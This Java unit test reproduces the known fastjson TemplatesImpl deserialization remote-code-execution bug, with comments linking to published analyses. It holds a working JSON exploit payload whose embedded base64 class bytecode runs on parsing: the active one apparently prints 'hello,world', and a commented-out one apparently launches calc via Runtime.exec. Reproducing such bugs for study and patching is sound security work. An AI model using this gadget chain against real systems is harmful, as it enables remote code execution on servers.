package com.tencent.json;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import org.junit.Test;

import java.io.IOException;

/**
 *  复现fastjson的安全问题：http://www.machengyu.net/tech/2020/03/01/fastjson-rce.html
 *  json解析安全分析：
 *  https://github.com/shengqi158/fastjson-remote-code-execute-poc/blob/master/Java_JSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%AE%87_%E7%9C%8B%E9%9B%AA%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A.pdf
 *  fastjson漏洞复现：https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/
 *  找出hashcode对应的黑名单类:https://github.com/LeadroyaL/fastjson-blacklist
 *  fastjson的安全问题复现.
 *  fastjson的黑名单commit：https://github.com/alibaba/fastjson/commit/1e1239eb5f4c2052dbc097d2c4e619ebc6e5cc28
 *  jackson的多态的反序列化类似实现：https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization
 *
 * Created by walker on 2020/6/7.
 */
public class FastJsonSafePoc {

    /**
     * 可以在https://www.hitoy.org/tool/file_base64.php 这里获取字节码文件的base64编码.
     * 字节码@see poc_1.java
     * @throws IOException
     */
    @Test
    public void testTemplatesImpl() throws IOException {
        String payload_2 = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_bytecodes\":[\"" +
                "yv66vgAAADQANgoABwAlCQAmACcIACgKACkAKgcAKwoABQAlBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABhMY29tL3RlbmNlbnQvanNvbi9wb2NfMTsBAApFeGNlcHRpb25zBwAtAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACWhhRm5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALgEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAvAQAKU291cmNlRmlsZQEACnBvY18xLmphdmEMAAgACQcAMAwAMQAyAQALaGVsbG8sd29ybGQHADMMADQANQEAFmNvbS90ZW5jZW50L2pzb24vcG9jXzEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAPwACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAIACwAAAA4AAwAAABAABAARAAwAEwAMAAAADAABAAAADQANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABYADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABkADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAGwAIABwADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ="
//                "yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAKcG9jXzEuamF2YQwACAAJBwAhDAAiACMBAARjYWxjDAAkACUBAAVwb2NfMQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAJAAQACgANAAsADAAAAAQAAQANAAEADgAPAAEACgAAABkAAAAEAAAAAbEAAAABAAsAAAAGAAEAAAAOAAEADgAQAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEQAJABIAEwACAAoAAAAlAAIAAgAAAAm7AAVZtwAGTLEAAAABAAsAAAAKAAIAAAATAAgAFAAMAAAABAABABQAAQAVAAAAAgAW"
                +
                "\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{},\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
        JSON.parseObject(payload_2, new Feature[]{Feature.SupportNonPublicField});
    }
}
